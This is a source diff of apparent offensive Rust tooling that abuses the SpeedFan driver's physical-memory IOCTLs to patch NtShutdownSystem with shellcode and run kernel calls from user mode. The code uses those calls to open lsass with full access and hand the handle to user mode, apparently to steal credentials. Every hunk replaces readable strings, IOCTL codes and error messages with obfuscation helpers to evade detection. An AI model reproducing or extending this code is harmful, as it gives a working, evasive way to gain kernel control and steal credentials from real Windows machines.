@@ -1,17 +1,12 @@
 //! sfdrvx64.sys DM_KernelSyscall — SpeedFan driver physical memory R/W
 //!
-//! IOCTLs:
-//!   0x9C402428 — IOCTL_PHYMEM_READ:  read N bytes from physical address
-//!   0x9C40242C — IOCTL_PHYMEM_WRITE: write N bytes to physical address
+//! SpeedFan driver exposes two IOCTLs via MmMapIoSpace for physical memory R/W.
 //!
 //! Flow is identical to eneio64: locate NtShutdownSystem in physical memory,
 //! patch it with JMP shellcode, call from user-mode, restore.
 
 use crate::resolver::*;
 use windows::Win32::Foundation::*;
-
-const IOCTL_PHYMEM_READ: u32 = 0x9C402428;
-const IOCTL_PHYMEM_WRITE: u32 = 0x9C40242C;
 
 type FnCreateFileW =
     unsafe extern "system" fn(*const u16, u32, u32, *const u8, u32, u32, HANDLE) -> HANDLE;
@@ -77,7 +72,7 @@ impl DmEngine {
         };
 
         // 3. Open sfdrvx64 device (\\.\Speedfan)
-        let path: Vec<u16> = "\\\\.\\Speedfan\0".encode_utf16().collect();
+        let path = crate::obfstr_helper::dev_speedfan();
         let device = unsafe {
             fn_create(
                 path.as_ptr(),
@@ -126,7 +121,7 @@ impl DmEngine {
     // Physical memory primitives (sfdrvx64 IOCTLs)
     // ═══════════════════════════════════════════════════════════════════════
 
-    /// Read physical memory via IOCTL_PHYMEM_READ (0x9C402428)
+    /// Read physical memory via sfdrvx64 read IOCTL
     ///
     /// Input buffer: [8 bytes physical address]
     /// Output buffer: [N bytes read data] (size = output buffer length)
@@ -136,7 +131,7 @@ impl DmEngine {
         let ok = unsafe {
             (self.fn_ioctl)(
                 self.device,
-                IOCTL_PHYMEM_READ,
+                crate::obfstr_helper::ioctl_phymem_read(),
                 input.as_ptr(),
                 8, // input: 8 bytes physical address
                 buf.as_mut_ptr(),
@@ -156,7 +151,7 @@ impl DmEngine {
         Ok(())
     }
 
-    /// Write physical memory via IOCTL_PHYMEM_WRITE (0x9C40242C)
+    /// Write physical memory via sfdrvx64 write IOCTL
     ///
     /// Input buffer: [8 bytes physical address] + [N bytes data]
     fn write_phys(&self, phys_addr: u64, data: &[u8]) -> Result<(), String> {
@@ -169,7 +164,7 @@ impl DmEngine {
         let ok = unsafe {
             (self.fn_ioctl)(
                 self.device,
-                IOCTL_PHYMEM_WRITE,
+                crate::obfstr_helper::ioctl_phymem_write(),
                 input.as_ptr(),
                 input.len() as u32,
                 std::ptr::null_mut(),
@@ -194,18 +189,26 @@ impl DmEngine {
     // ═══════════════════════════════════════════════════════════════════════
 
     fn get_physical_memory_ranges() -> Result<Vec<(u64, u64)>, String> {
-        use windows::core::w;
         use windows::Win32::System::Registry::*;
 
         let mut key = HKEY::default();
-        let subkey = w!("HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory");
+        let subkey = crate::obfstr_helper::phys_mem_regkey();
 
-        let status = unsafe { RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey, 0, KEY_READ, &mut key) };
+        let status = unsafe {
+            RegOpenKeyExW(
+                HKEY_LOCAL_MACHINE,
+                windows::core::PCWSTR(subkey.as_ptr()),
+                0,
+                KEY_READ,
+                &mut key,
+            )
+        };
         if status.is_err() {
             return Err(format!("RegOpenKeyExW failed: {:?}", status));
         }
 
-        let value_name = w!(".Translated");
+        let value_name_buf = crate::obfstr_helper::translated_value();
+        let value_name = windows::core::PCWSTR(value_name_buf.as_ptr());
         let mut data_type = REG_VALUE_TYPE::default();
         let mut data_size: u32 = 0;
 
@@ -380,23 +383,25 @@ impl DmEngine {
 
     /// Get NtShutdownSystem RVA and first 32 bytes of code from on-disk ntoskrnl.exe
     fn get_trampoline_info() -> Result<(u32, Vec<u8>), String> {
+        let ntos_wide = crate::obfstr_helper::ntos_filename_wide();
         let lib = unsafe {
             windows::Win32::System::LibraryLoader::LoadLibraryExW(
-                windows::core::w!("ntoskrnl.exe"),
+                windows::core::PCWSTR(ntos_wide.as_ptr()),
                 None,
                 windows::Win32::System::LibraryLoader::DONT_RESOLVE_DLL_REFERENCES,
             )
         }
-        .map_err(|e| format!("LoadLibraryExW ntoskrnl.exe: {}", e))?;
+        .map_err(|e| format!("LoadLibraryExW: {}", e))?;
 
         let base = lib.0 as *const u8;
+        let nt_name = crate::obfstr_helper::nt_shutdown_system_bytes();
         let func = unsafe {
             windows::Win32::System::LibraryLoader::GetProcAddress(
                 lib,
-                windows::core::s!("NtShutdownSystem"),
+                windows::core::PCSTR(nt_name.as_ptr()),
             )
         };
-        let func_addr = func.ok_or("NtShutdownSystem not found in ntoskrnl.exe")?;
+        let func_addr = func.ok_or("export not found")?;
         let rva = (func_addr as usize - base as usize) as u32;
 
         let mut ref_bytes = vec![0u8; 32];
@@ -500,7 +505,7 @@ impl DmEngine {
 
         let status = unsafe {
             self.kernel_syscall(
-                "ZwOpenProcess",
+                &crate::obfstr_helper::zw_open_process(),
                 &[
                     &mut h_lsass as *mut usize as usize,
                     0x1F0FFF, // PROCESS_ALL_ACCESS
@@ -527,7 +532,7 @@ impl DmEngine {
 
         let status = unsafe {
             self.kernel_syscall(
-                "ZwOpenProcess",
+                &crate::obfstr_helper::zw_open_process(),
                 &[
                     &mut h_current as *mut usize as usize,
                     0x1F0FFF,
@@ -548,7 +553,7 @@ impl DmEngine {
         let mut h_user: usize = 0;
         let status = unsafe {
             self.kernel_syscall(
-                "ZwDuplicateObject",
+                &crate::obfstr_helper::zw_duplicate_object(),
                 &[
                     usize::MAX, // NtCurrentProcess() = (HANDLE)-1
                     h_lsass,
@@ -567,8 +572,8 @@ impl DmEngine {
 
         // 4. Close kernel handles
         unsafe {
-            let _ = self.kernel_syscall("ZwClose", &[h_lsass]);
-            let _ = self.kernel_syscall("ZwClose", &[h_current]);
+            let _ = self.kernel_syscall(&crate::obfstr_helper::zw_close(), &[h_lsass]);
+            let _ = self.kernel_syscall(&crate::obfstr_helper::zw_close(), &[h_current]);
         }
 
         Ok(HANDLE(h_user as *mut _))
@@ -579,8 +584,8 @@ impl DmEngine {
     // ═══════════════════════════════════════════════════════════════════════
 
     fn find_export_rva_from_disk(func_name: &str) -> Result<u32, String> {
-        let path = "C:\\Windows\\System32\\ntoskrnl.exe";
-        let data = std::fs::read(path).map_err(|e| format!("read ntoskrnl.exe: {}", e))?;
+        let path = crate::obfstr_helper::ntos_path();
+        let data = std::fs::read(&path).map_err(|e| format!("read failed: {}", e))?;
 
         let pe_off = u32::from_le_bytes(data[0x3C..0x40].try_into().unwrap()) as usize;
         let opt_off = pe_off + 24;
